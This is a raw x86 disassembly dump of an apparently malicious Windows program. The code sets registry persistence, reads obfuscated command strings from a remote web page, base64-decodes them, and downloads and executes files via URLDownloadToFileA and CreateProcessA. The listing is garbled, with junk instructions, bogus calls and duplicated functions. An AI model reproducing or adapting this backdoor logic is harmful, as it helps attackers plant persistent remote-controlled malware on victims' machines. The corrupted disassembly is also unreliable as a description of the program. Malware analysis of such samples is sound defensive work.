sub_401010
mov eax [ esp + 0x4 ]
cmp eax 0x41
jb r-xdata
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
cmp eax 0x30
jb r-xdata
cmp eax 0x7a
ja r-xdata
add eax 0xffffffbf
retn 0x4
cmp eax 0x2b
jne r-xdata
cmp eax 0x39
ja r-xdata
add eax 0xffffffb9
retn 0x4
sub eax 0x2f
neg eax
sbb eax eax
and al 0xc0
add eax 0x3f
retn 0x4
mov eax 0x3e
retn 0x4
add eax 0x4
retn 0x4
sub_401060
push ecx
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
mov [ esp + 0x4 ] ecx
je r-xdata
xor eax eax
pop ebx
pop ecx
retn 0x10
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
add eax ebx
cmp ebx eax
mov [ esp + 0x10 ] eax
jae r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
pop ebx
mov [ ecx ] eax
mov eax 0x1
pop ecx
retn 0x10
push ebp
push esi
push edi
mov eax edi
mov ecx 0x18
cdq
and edx 0x7
sub ecx edi
add eax edx
sar eax 0x3
shl esi cl
test eax eax
jle r-xdata
movsx ecx [ ebx ]
push ecx
mov ecx [ esp + 0x14 ]
call sub_401010
inc ebx
cmp eax 0xffffffff
jne r-xdata
cmp ebx [ esp + 0x1c ]
jb r-xdata
add [ esp + 0x18 ] eax
shl esi 0x6
or esi eax
add edi 0x6
dec ebp
jmp r-xdata
xor esi esi
xor edi edi
xor ebp ebp
pop edi
pop esi
pop ebp
mov edi [ esp + 0x20 ]
mov edx esi
shr edx 0x10
mov [ edi ] dl
shl esi 0x8
inc edi
dec eax
mov [ esp + 0x20 ] edi
jne r-xdata
cmp ebx [ esp + 0x1c ]
jae r-xdata
inc ebp
cmp ebp 0x4
jl r-xdata
sub_401130
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx eax
shr ecx 0x9
and ecx 0x1
xor ecx edx
je r-xdata
retn
mov ecx eax
shr ecx 0x1
xor ecx eax
shr ecx 0x1
xor ecx eax
shr ecx 0x3
xor ecx eax
and eax 0x3ffff
shr ecx 0xd
shl eax 0x1
test cl 0x1
je r-xdata
xor eax 0x1
sub_401170
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx eax
shr ecx 0xb
and ecx 0x1
xor ecx edx
je r-xdata
retn
mov ecx eax
shr ecx 0x1
xor ecx eax
shr ecx 0x4
xor ecx eax
shr ecx 0x4
xor ecx eax
and eax 0x1fffff
shr ecx 0xc
shl eax 0x1
test cl 0x1
je r-xdata
xor eax 0x1
sub_4011b0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx eax
shr ecx 0xb
and ecx 0x1
xor ecx edx
je r-xdata
retn
mov ecx eax
shr ecx 0x1
xor ecx eax
shr ecx 0x3
xor ecx eax
shr ecx 0x1
xor ecx eax
and eax 0x3fffff
shr ecx 0x11
shl eax 0x1
test cl 0x1
je r-xdata
xor eax 0x1
sub_4011f0
mov eax [ esp + 0x8 ]
push ebx
push esi
movsx edx [ eax ]
movsx ecx [ eax + 0x1 ]
shl edx 0x8
or edx ecx
mov cl [ eax + 0x2 ]
sar cl 0x5
movsx ecx cl
shl edx 0x3
or edx ecx
mov ecx [ esp + 0xc ]
mov [ ecx ] edx
mov bl [ eax + 0x5 ]
movsx edx [ eax + 0x2 ]
movsx esi [ eax + 0x3 ]
shl edx 0x6
or edx esi
movsx esi [ eax + 0x4 ]
shl edx 0x8
sar bl 0x7
or edx esi
movsx esi bl
shl edx 0x1
or edx esi
mov [ ecx + 0x4 ] edx
movsx edx [ eax + 0x5 ]
movsx esi [ eax + 0x6 ]
movsx eax [ eax + 0x7 ]
shl edx 0x9
or edx esi
pop esi
shl edx 0x8
or edx eax
pop ebx
mov [ ecx + 0x8 ] edx
retn
sub_401260
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push eax
push ecx
push edx
call sub_4012c0
mov edi eax
mov eax [ esi ]
push eax
push edi
call sub_401130
mov ecx [ esi + 0x4 ]
mov [ esi ] eax
push ecx
push edi
call sub_401170
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
push edx
push edi
call sub_4011b0
mov edi [ esi ]
mov ecx eax
mov eax [ esi + 0x4 ]
add esp 0x24
xor eax edi
mov [ esi + 0x8 ] ecx
xor eax ecx
pop edi
and eax 0x1
pop esi
retn
sub_4012c0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
and al 0x80
xor ecx ecx
cmp al 0x80
sete cl
and edx 0x800
xor eax eax
cmp edx 0x800
mov edx [ esp + 0xc ]
sete al
add ecx eax
and edx 0x800
xor eax eax
cmp edx 0x800
sete al
add ecx eax
xor eax eax
cmp ecx 0x1
setle al
retn
sub_401310
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
xor esi esi
mov bl 0x1
test ebp ebp
jle r-xdata
pop esi
pop ebp
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push eax
call sub_401260
mov dl [ esi + edi ]
add esp 0x4
shl bl 0x1
or bl al
xor dl bl
mov [ esi + edi ] dl
inc esi
cmp esi ebp
jl r-xdata
pop edi
sub_401370
push ebx
mov ebx [ esp + 0x10 ]
xor ecx ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0xc ]
pop ebx
mov [ ecx + eax ] 0x0
retn
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
movsx eax [ ecx + esi - 0x1 ]
add eax ecx
mov ebp 0x5f
cdq
idiv ebp
movsx eax [ ecx + esi ]
sub eax edx
movsx eax [ esi ]
sub eax 0x55
jmp r-xdata
mov [ ecx + edi ] al
inc ecx
cmp ecx ebx
jl r-xdata
add eax 0x5f
cmp eax 0x20
jge r-xdata
test ecx ecx
jne r-xdata
mov [ ecx + edi ] 0x0
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4013d0
push ebp
mov ebp esp
sub esp 0x120
push ebx
push esi
push edi
mov [ ebp - 0x8 ] 0x0
je r-xdata
push 0x104
lea eax [ ebp - 0x10c ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
jne r-xdata
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_402c52
add esp 0x4
mov [ ebp - 0x11c ] eax
mov ecx [ ebp - 0x11c ]
mov [ ebp - 0x114 ] ecx
clc
jae r-xdata
call 0x507d9ff9
mov al [ 0xffffffffc9830040 ]
push [ ebx ]
shl dl 0xae
clc
nop
jae r-xdata
call 0x41185c
add [ ebp - 0x10b7b ] cl
call [ eax + 0x6a ]
add bh bh
adc eax GetModuleFileNameA@IAT
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov edx [ ebp - 0x114 ]
push edx
mov eax [ rw-data ]
push eax
call sub_401370
add esp 0xc
je r-xdata
call 0x507da02c
mov al [ 0xffffffffc9830040 ]
push [ ebx ]
shl dl 0xae
lea ecx [ ebp - 0x118 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x114 ]
push eax
push 0x80000001
call [ RegCreateKeyExA@IAT ]
je r-xdata
jne r-xdata
lea edi [ ebp - 0x10c ]
or ecx 0xffffffff
xor eax eax
jne r-xdata
jmp r-xdata
nop
nop
nop
mov eax [ ebp - 0x8 ]
push eax
call [ RegCloseKey@IAT ]
je r-xdata
jne r-xdata
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
lea ecx [ ebp - 0x10c ]
push ecx
push 0x2
push 0x0
push rw-data
mov edx [ ebp - 0x8 ]
0xf4bd8de8 0xfffe
inc [ ebx - 0x3fcc0037 ]
jmp 0xffffffff8bd0a580
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x114 ]
push edx
push 0x80000002
call [ RegCreateKeyExA@IAT ]
clc
jae r-xdata
call 0xffffffffe8c5a325
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov ecx [ ebp - 0x114 ]
push ecx
mov edx [ rw-data ]
push edx
call sub_401370
add esp 0xc
clc
nop
jae r-xdata
0x543d8be8 0x40a0
add [ ebx - 0x3fcc0037 ] al
push edx
call [ RegSetValueExA@IAT ]
je r-xdata
push ebp
clc
lea edi [ ebp - 0x10c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
lea eax [ ebp - 0x10c ]
push eax
push 0x2
push 0x0
push rw-data
mov ecx [ ebp - 0x8 ]
push ecx
call [ RegSetValueExA@IAT ]
clc
nop
jae r-xdata
call 0xfffffffff4fda358
mov edx [ ebp - 0x8 ]
push edx
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x114 ]
mov [ ebp - 0x120 ] eax
mov ecx [ ebp - 0x120 ]
push ecx
call sub_402c47
add esp 0x4
push 0x5c
lea edx [ ebp - 0x10c ]
push edx
call sub_402c20
add esp 0x8
mov [ ebp - 0x110 ] eax
je r-xdata
call 0xfffffffff895a18f
mov eax [ ebp - 0x110 ]
lea ecx [ ebp - 0x10c ]
sub eax ecx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
jne r-xdata
nop
nop
nop
lea eax [ ebp - 0x10c ]
push eax
call [ SetCurrentDirectoryA@IAT ]
clc
nop
jae r-xdata
jne r-xdata
0xf0858be8 0xfffe
dec [ ebp - 0x10b73 ]
[ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call 0x5b9e761d
jmp r-xdata
mov [ ebp + edx - 0x10c ] 0x0
je r-xdata
cld
sub_401640
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
jne r-xdata
mov eax [ ebp + 0x10 ]
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call send
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push esi
push edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
je r-xdata
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x4 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x8 ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4016b0
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
clc
nop
jae r-xdata
xor eax eax
jmp r-xdata
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_402c52
add esp 0x4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
nop
clc
jae r-xdata
call 0x387da2c9
mov al [ 0xffffffffc9830040 ]
push [ ebx ]
shl dl 0xae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov ecx [ ebp - 0x14 ]
push ecx
mov edx [ rw-data ]
push edx
call sub_401370
add esp 0xc
je r-xdata
call 0x387da2a6
mov al [ 0xffffffffc9830040 ]
push [ ebx ]
shl dl 0xae
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
jne r-xdata
call sub_402e20
add esp 0x8
mov [ ebp - 0x4 ] eax
je r-xdata
0xec458be8 0x8b50
dec ebp
or al 0x51
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
push eax
call sub_402c47
add esp 0x4
mov ecx [ ebp - 0x4 ]
add ecx 0xb
mov [ ebp - 0xc ] ecx
push 0x20
mov edx [ ebp - 0xc ]
push edx
call sub_402d60
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx ecx [ eax + 0x1 ]
cmp ecx 0x2d
jne r-xdata
xor eax eax
jmp r-xdata
hlt
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
movsx eax [ edx + 0x2 ]
cmp eax 0x2d
jne r-xdata
mov ecx [ ebp - 0x4 ]
movsx edx [ ecx + 0x3 ]
cmp edx 0x3e
jne r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
mov [ ecx + eax ] 0x0
jmp r-xdata
mov edi [ ebp - 0xc ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x1c ]
call sub_401000
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x1
push eax
call sub_402c52
add esp 0x4
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] ecx
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
lea ecx [ ebp - 0x1c ]
call sub_401060
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x18 ]
push ecx
call [ OutputDebugStringA@IAT ]
mov edx [ ebp - 0x18 ]
movsx eax [ edx ]
cmp eax 0x73
jne r-xdata
mov ecx [ ebp - 0x18 ]
movsx edx [ ecx ]
cmp edx 0x7a
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x1
mov edx [ ebp - 0x18 ]
add edx 0x2
push edx
call sub_402cf6
add esp 0x4
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x18 ]
movsx edx [ ecx ]
cmp edx 0x64
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x30 ]
push eax
call sub_402c47
add esp 0x4
mov eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
push 0x3a
mov edx [ ebp - 0x18 ]
push edx
call sub_402d60
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
mov ecx [ ebp - 0x18 ]
add ecx 0x2
mov edi ecx
mov edx [ ebp + 0x8 ]
add edx 0x34
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x18 ]
mov esi [ ebp - 0x18 ]
mov edi [ ebp + 0x8 ]
add edi 0x14
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
add eax 0x1
push eax
call sub_402ceb
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
push ecx
call sub_402c47
add esp 0x4
xor eax eax
jmp r-xdata
sub_401960
push ebp
mov ebp esp
sub esp 0x11c
push ebx
push esi
push edi
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_402c52
add esp 0x4
mov [ ebp - 0x118 ] eax
mov eax [ ebp - 0x118 ]
mov [ ebp - 0xc ] eax
nop
clc
jae r-xdata
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ rw-data ]
call 0x447da53a
mov al [ 0xffffffffc9830040 ]
push [ ebx ]
shl dl 0xae
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
call [ InternetOpenA@IAT ]
mov [ ebp - 0x8 ] eax
nop
clc
jae r-xdata
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x11c ] ecx
mov edx [ ebp - 0x11c ]
push edx
call sub_402c47
add esp 0x4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call 0xfffffffff48da58d
jmp r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
push edx
call sub_401370
add esp 0xc
je r-xdata
push 0x0
push 0x80000000
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx 0x40
xor eax eax
lea edi [ ebp - 0x110 ]
[ edi ]
mov [ ebp - 0x114 ] 0x0
clc
jae r-xdata
mov edx [ ebp - 0x8 ]
push edx
call [ InternetCloseHandle@IAT ]
xor eax eax
jmp r-xdata
push ecx
call [ InternetOpenUrlA@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call 0xa81a90
add [ eax ] al
sub [ edx ] 0x6a
add [ ebx - 0x74aff7bb ] cl
dec ebp
clc
lea eax [ ebp - 0x114 ]
push eax
push 0xff
lea ecx [ ebp - 0x110 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call [ InternetReadFile@IAT ]
mov [ ebp - 0x4 ] eax
je r-xdata
call 0xffffffffecc5a862
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
jne r-xdata
mov edx [ ebp - 0x10 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x8 ]
push eax
call [ InternetCloseHandle@IAT ]
lea ecx [ ebp - 0x110 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_4016b0
add esp 0x8
mov eax [ ebp - 0x10 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x8 ]
push ecx
call [ InternetCloseHandle@IAT ]
xor eax eax
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x114 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x2e
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402c20
jae r-xdata
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_402c52
add esp 0x4
mov [ ebp - 0x168 ] eax
mov eax [ ebp - 0x168 ]
mov [ ebp - 0x164 ] eax
jb r-xdata
push 0x2f
mov edx [ ebp + 0x8 ]
push edx
call sub_402c20
add esp 0x8
mov [ ebp - 0x160 ] eax
cmp [ ebp - 0x160 ] 0x0
je r-xdata
add esp 0x8
mov [ ebp - 0x15c ] eax
cmp [ ebp - 0x15c ] 0x0
je r-xdata
call 0x4dcb49ae
or [ ecx - 0x18 ] dl
aad 0x10
add [ eax ] al
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
jae r-xdata
clc
jae r-xdata
lea edi [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov eax 0x104
sub eax ecx
push eax
push rw-data
lea ecx [ ebp - 0x114 ]
push ecx
call sub_402ef0
add esp 0xc
jb r-xdata
jne r-xdata
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov ecx [ ebp - 0x164 ]
push ecx
mov edx [ rw-data ]
call 0xffffffffa07459f9
inc eax
add [ ebx - 0x3fcc0037 ] al
lea edi [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov eax 0x104
sub eax ecx
push eax
push rw-data
lea ecx [ ebp - 0x114 ]
push ecx
call sub_402ef0
add esp 0xc
jle r-xdata
call 0xffffffffecfda976
mov edi [ ebp - 0x164 ]
lea edx [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x164 ]
mov [ ebp - 0x16c ] eax
mov ecx [ ebp - 0x16c ]
push ecx
call sub_402c47
add esp 0x4
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x15c ]
sub edx [ ebp - 0x160 ]
push edx
mov eax [ ebp - 0x160 ]
add eax 0x1
push eax
lea ecx [ ebp - 0x114 ]
push ecx
call sub_402ef0
add esp 0xc
je r-xdata
jg r-xdata
jb r-xdata
call 0xfffffffffedcda6b
push edx
call sub_401370
add esp 0xc
je r-xdata
mov edi rw-data
jne r-xdata
call 0xfffffffffee4b155
push 0x0
push 0x0
jae r-xdata
jmp r-xdata
lea edx [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
0xa140bfe8 0x40
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x158 ]
[ edi ]
mov [ ebp - 0x158 ] 0x44
mov [ ebp - 0x12c ] 0x1
mov [ ebp - 0x128 ] 0x5
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
jb r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x114 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push 0x0
call URLDownloadToFileA
test eax eax
je r-xdata
call 0xaa1db0
lea edx [ ebp - 0x10 ]
push edx
jae r-xdata
mov edx [ ebp - 0x10 ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0xc ]
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x158 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x114 ]
push ecx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
call 0x5330733b
sub_401b00
push ebp
mov ebp esp
sub esp 0x16c
push ebx
push esi
push edi
jle r-xdata
lea eax [ ebp - 0x114 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
test eax eax
je r-xdata
jg r-xdata
xor eax eax
jmp r-xdata
jb r-xdata
call 0xffffffffff2ca0aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x2e
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402c20
jae r-xdata
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_402c52
add esp 0x4
mov [ ebp - 0x168 ] eax
mov eax [ ebp - 0x168 ]
mov [ ebp - 0x164 ] eax
jb r-xdata
push 0x2f
mov edx [ ebp + 0x8 ]
push edx
call sub_402c20
add esp 0x8
mov [ ebp - 0x160 ] eax
cmp [ ebp - 0x160 ] 0x0
je r-xdata
add esp 0x8
mov [ ebp - 0x15c ] eax
cmp [ ebp - 0x15c ] 0x0
je r-xdata
call 0x4dcb49ae
or [ ecx - 0x18 ] dl
aad 0x10
add [ eax ] al
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
jae r-xdata
clc
jae r-xdata
lea edi [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov eax 0x104
sub eax ecx
push eax
push rw-data
lea ecx [ ebp - 0x114 ]
push ecx
call sub_402ef0
add esp 0xc
jb r-xdata
jne r-xdata
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov ecx [ ebp - 0x164 ]
push ecx
mov edx [ rw-data ]
call 0xffffffffa07459f9
inc eax
add [ ebx - 0x3fcc0037 ] al
lea edi [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
mov eax 0x104
sub eax ecx
push eax
push rw-data
lea ecx [ ebp - 0x114 ]
push ecx
call sub_402ef0
add esp 0xc
jle r-xdata
call 0xffffffffecfda976
mov edi [ ebp - 0x164 ]
lea edx [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp - 0x164 ]
mov [ ebp - 0x16c ] eax
mov ecx [ ebp - 0x16c ]
push ecx
call sub_402c47
add esp 0x4
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x15c ]
sub edx [ ebp - 0x160 ]
push edx
mov eax [ ebp - 0x160 ]
add eax 0x1
push eax
lea ecx [ ebp - 0x114 ]
push ecx
call sub_402ef0
add esp 0xc
je r-xdata
jg r-xdata
jb r-xdata
call 0xfffffffffedcda6b
push edx
call sub_401370
add esp 0xc
je r-xdata
mov edi rw-data
jne r-xdata
call 0xfffffffffee4b155
push 0x0
push 0x0
jae r-xdata
jmp r-xdata
lea edx [ ebp - 0x114 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
0xa140bfe8 0x40
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x158 ]
[ edi ]
mov [ ebp - 0x158 ] 0x44
mov [ ebp - 0x12c ] 0x1
mov [ ebp - 0x128 ] 0x5
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
jb r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x114 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
push 0x0
call URLDownloadToFileA
test eax eax
je r-xdata
call 0xaa1db0
lea edx [ ebp - 0x10 ]
push edx
jae r-xdata
mov edx [ ebp - 0x10 ]
push edx
call [ CloseHandle@IAT ]
mov eax [ ebp - 0xc ]
push eax
call [ CloseHandle@IAT ]
mov eax 0x1
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x158 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x114 ]
push ecx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
call 0x5330733b
sub_401e00
push ebp
mov ebp esp
sub esp 0x3fc
push ebx
push esi
push edi
clc
nop
jae r-xdata
call sub_4013d0
clc
nop
jae r-xdata
call 0xfffffffff5f60701
jb r-xdata
call 0x7c22e10
add [ eax ] al
add [ edi ] cl
add [ ecx ] 0x0
add [ eax ] al
lea eax [ ebp - 0x3e4 ]
push eax
push 0x101
call WSAStartup
jae r-xdata
clc
nop
jae r-xdata
jae r-xdata
call 0xfffffffffc5ca3c3
push 0x0
push 0x0
call [ InternetGetConnectedState@IAT ]
test eax eax
jne r-xdata
call 0x6a408945
add bh bh
adc eax InternetGetConnectedState@IAT
call 0xffffffff834faf4c
add al [ eax ]
add [ eax ] al
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call sub_402c52
add esp 0x4
mov [ ebp - 0x3f4 ] eax
mov ecx [ ebp - 0x3f4 ]
mov [ ebp - 0x18 ] ecx
nop
clc
jae r-xdata
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
mov edi [ rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
mov edx [ ebp - 0x18 ]
push edx
mov eax [ rw-data ]
push eax
call sub_401370
add esp 0xc
jle r-xdata
call 0x307daa43
mov al [ 0xffffffffc9830040 ]
push [ ebx ]
shl dl 0xae
mov ecx 0x4e
xor eax eax
lea edi [ ebp - 0x250 ]
jg r-xdata
